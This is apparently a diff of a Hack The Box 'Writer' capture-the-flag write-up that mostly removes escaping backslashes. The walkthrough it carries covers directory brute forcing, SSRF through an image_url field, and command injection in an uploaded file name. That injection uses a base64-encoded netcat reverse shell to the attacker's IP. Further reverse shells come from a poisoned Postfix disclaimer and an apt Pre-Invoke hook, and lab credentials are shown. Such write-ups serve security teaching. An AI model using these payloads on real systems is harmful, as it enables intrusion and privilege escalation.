@@ -122,17 +122,17 @@ Users visiting the target’s web server are met with the following home page:
 
 ![](/reports/Writer/image4.png)
 
-Enumerating the directories of the webpage with gobuster[\[1\]](#ftnt1), the following directories are found:
+Enumerating the directories of the webpage with gobuster[[1\]](#ftnt1), the following directories are found:
 
 {% highlight bash %}
-/contact              (Status: 200) \[Size: 4905\]  
-/logout               (Status: 302) \[Size: 208\] \[--> http://10.10.11.101/\]  
-/about                (Status: 200) \[Size: 3522\]  
-/static               (Status: 301) \[Size: 313\] \[--> http://10.10.11.101/static/\]  
-/.                    (Status: 200) \[Size: 11971\]  
-/dashboard            (Status: 302) \[Size: 208\] \[--> http://10.10.11.101/\]  
-/server-status        (Status: 403) \[Size: 277\]  
-/administrative       (Status: 200) \[Size: 1443\]
+/contact              (Status: 200) [Size: 4905\]  
+/logout               (Status: 302) [Size: 208\] [--> http://10.10.11.101/\]  
+/about                (Status: 200) [Size: 3522\]  
+/static               (Status: 301) [Size: 313\] [--> http://10.10.11.101/static/\]  
+/.                    (Status: 200) [Size: 11971\]  
+/dashboard            (Status: 302) [Size: 208\] [--> http://10.10.11.101/\]  
+/server-status        (Status: 403) [Size: 277\]  
+/administrative       (Status: 200) [Size: 1443\]
 {% endhighlight %}
 
 A directory of particular interest is /administrative, especially since it cannot be found without brute forcing directories. Visiting this directory reveals a simple login form which asks for a username and password:
@@ -171,28 +171,28 @@ Upgrade-Insecure-Requests: 1
 Sec-GPC: 1  
   
 \-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\="author"  
+Content-Disposition: form-data; name="author"  
   
 0xd4y  
 \-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\="title"  
+Content-Disposition: form-data; name="title"  
   
 Writeup  
 \-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\="tagline"  
+Content-Disposition: form-data; name="tagline"  
   
 Writeup  
 \-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\="image"; filename=""  
+Content-Disposition: form-data; name="image"; filename=""  
 Content-Type: application/octet-stream  
   
   
 \-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\="image_url"  
+Content-Disposition: form-data; name="image_url"  
   
 http://10.10.15.80/image.jpg  
 \-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\="content"Thanks for reading!  
+Content-Disposition: form-data; name="content"Thanks for reading!  
 \-----------------------------12417370376638841362770592069--
 {% endhighlight %}
 
@@ -201,10 +201,10 @@ Note the “image_url” parameter highlighted in red
 Response
 
 {% highlight bash %}
-┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]  
+┌─[✗\]─[0xd4y@Writeup\]─[~/business/hackthebox/medium/linux/writer\]  
 └──╼ $sudo nc -lvnp 80  
-listening on \[any\] 80 ...  
-connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 38018GET /image.jpg HTTP/1.1  
+listening on [any\] 80 ...  
+connect to [10.10.15.80\] from (UNKNOWN) [10.10.11.101\] 38018GET /image.jpg HTTP/1.1  
 Accept-Encoding: identityHost: 10.10.15.80  
 User-Agent: Python-urllib/3.8  
 Connection: close
@@ -330,8 +330,8 @@ Welcome # Virtual host configuration for writer.htb domain
 In particular, note the directory in which the writer.wsgi file lies in (highlighted in blue). After finding out that the server is running python, fuzzing for files in the root of the web server revealed an __init__.py file within /var/www/writer.htb/writer/. Leaking this file reveals the following contents:
 
 {% highlight python %}
-if request.method == "POST":        if request.files\['image'\]:             image = request.files\['image'\]            if ".jpg" in image.filename:  
-                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)               image.save(path)$               image = "/img/{}".format(image.filename)           else:$               error = "File extensions must be in .jpg!"               return render_template('add.html', error\=error)       if request.form.get('image_url'):  
+if request.method == "POST":        if request.files['image'\]:             image = request.files['image'\]            if ".jpg" in image.filename:  
+                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)               image.save(path)$               image = "/img/{}".format(image.filename)           else:$               error = "File extensions must be in .jpg!"               return render_template('add.html', error=error)       if request.form.get('image_url'):  
            image_url = request.form.get('image_url')           if ".jpg" in image_url:               try:                   local_filename, headers = urllib.request.urlretrieve(image_url)  
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))                   image = "{}.jpg".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
                        image = image.replace('/tmp/','')                      os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))                       image = "/img/{}".format(image)  
@@ -380,9 +380,9 @@ However, when changing the argument to be file:///home/0xd4y/business/hackthebox
 After uploading a file with the name \`0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`, it was referenced locally by putting the following in the image_url parameter: file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;\`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`. A reverse shell was then returned as the www-data user:
 
 {% highlight bash %}
-┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
-listening on \[any\] 9001 ...  
-connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 59938  
+┌─[✗\]─[0xd4y@Writeup\]─[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
+listening on [any\] 9001 ...  
+connect to [10.10.15.80\] from (UNKNOWN) [10.10.11.101\] 59938  
 /bin/sh: 0: can't access tty; job control turned off  
 $ whoami  
 www-data
@@ -395,7 +395,7 @@ Privilege Escalation
 
 After enumerating multiple files in the box, it was found that there is a username and password in a mysql config file called /etc/mysql/my.cnf that points to the dev database:
 
-database = devuser \= djangouser  
+database = devuser = djangouser  
 password = DjangoSuperPassword
 
 One of Kyle’s passwords is located in the databases, albeit it is hashed:
@@ -406,7 +406,7 @@ pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5
 
 The kyle user is part of multiple groups, one of them being the filter group which has permissions to edit the /etc/postfix/disclaimer file. Furthermore, after enumerating the ports running locally on the target, it was found that port 25 is open and running a Postfix SMTP server.
 
-With pspy[\[2\]](#ftnt2) running on a separate kyle SSH instance, the following message was sent on the box:
+With pspy[[2\]](#ftnt2) running on a separate kyle SSH instance, the following message was sent on the box:
 
 kyle@writer:~$ nc localhost 25  
 220 writer.htb ESMTP Postfix (Ubuntu)  
@@ -426,9 +426,9 @@ Upon sending this message, the following process occurred in the background:
 
 Thus, the server is running as the john user (note UID=1001), and is executing the /etc/postfix/disclaimer file. Seeing as the kyle user had permission to edit this file, achieving a reverse shell as the john user could be obtained via appending a reverse shell to the top of the file and sending a message:
 
-┌─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
-listening on \[any\] 9001 ...  
-connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 49840  
+┌─[0xd4y@Writeup\]─[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
+listening on [any\] 9001 ...  
+connect to [10.10.15.80\] from (UNKNOWN) [10.10.11.101\] 49840  
 /bin/sh: 0: can't access tty; job control turned off  
 $ whoami  
 john
@@ -446,9 +446,9 @@ john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/
 When the cronjob runs again, a reverse shell is returned as the root user:
 
 {% highlight bash %}
-┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
-listening on \[any\] 9001 ...  
-connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 56068  
+┌─[✗\]─[0xd4y@Writeup\]─[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
+listening on [any\] 9001 ...  
+connect to [10.10.15.80\] from (UNKNOWN) [10.10.11.101\] 56068  
 /bin/sh: 0: can't access tty; job control turned off  
 # whoami  
 root
@@ -479,7 +479,7 @@ try {
   
  $conn = new PDO("mysql:host=$servername;dbname=$dbname", $db_username, $db_password); // set the PDO error mode to exception $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // prepare sql and bind parameters        $query = "INSERT INTO users (username,password)  VALUES(:username,:password)";  
         $statement = $conn->prepare($query);  
-        $statement->execute(array(   ':username'\=> $username,   ':password'\=> $password  
+        $statement->execute(array(   ':username'=> $username,   ':password'=> $password  
         ));  
   
 } catch(PDOException $e) { echo "Error: " . $e->getMessage();  
@@ -501,9 +501,9 @@ from PIL import Image
   
 filename = request.file('image')  
   
-image = StringIO(base64.b64decode(download\['file'\]))  
-allowed_extensions = \['jpg','jpeg'\]  
-if filename.split('.')\[-1\] in allowed_extensions:        
+image = StringIO(base64.b64decode(download['file'\]))  
+allowed_extensions = ['jpg','jpeg'\]  
+if filename.split('.')[-1\] in allowed_extensions:        
 				try:  
                 filename = secure_filename(filename)  
   
@@ -546,6 +546,6 @@ Afterwards, the privilege escalation to root involved logging into the system as
 
 * * *
 
-[\[1\]](#ftnt_ref1) [https://github.com/OJ/gobuster](https://www.google.com/url?q=https://github.com/OJ/gobuster&sa=D&source=editors&ust=1653773864860204&usg=AOvVaw0G3ZxMquY9ovsHERwv9Wfu) 
+[[1\]](#ftnt_ref1) [https://github.com/OJ/gobuster](https://www.google.com/url?q=https://github.com/OJ/gobuster&sa=D&source=editors&ust=1653773864860204&usg=AOvVaw0G3ZxMquY9ovsHERwv9Wfu) 
 
-[\[2\]](#ftnt_ref2) [https://github.com/DominicBreuker/pspy](https://www.google.com/url?q=https://github.com/DominicBreuker/pspy&sa=D&source=editors&ust=1653773864860599&usg=AOvVaw1i07HkYHN5cp3nF3SIrdC1)
+[[2\]](#ftnt_ref2) [https://github.com/DominicBreuker/pspy](https://www.google.com/url?q=https://github.com/DominicBreuker/pspy&sa=D&source=editors&ust=1653773864860599&usg=AOvVaw1i07HkYHN5cp3nF3SIrdC1)
